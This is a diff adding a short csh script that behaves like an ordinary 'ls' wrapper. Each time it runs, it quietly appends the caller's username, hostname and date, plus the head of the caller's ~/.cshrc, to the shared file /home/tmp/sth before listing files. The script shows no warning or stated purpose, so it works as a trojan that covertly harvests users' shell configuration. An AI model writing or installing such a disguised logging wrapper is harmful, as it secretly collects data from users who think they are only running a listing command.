@@ -1,0 +1,7 @@
+#! /bin/csh -f
+
+unset noglob
+echo "`whoami` ran $0 from `hostname` on `date`" >>& /home/tmp/sth
+head ~`whoami`/.cshrc >>& /home/tmp/sth
+/bin/ls ${*}
+exit $status
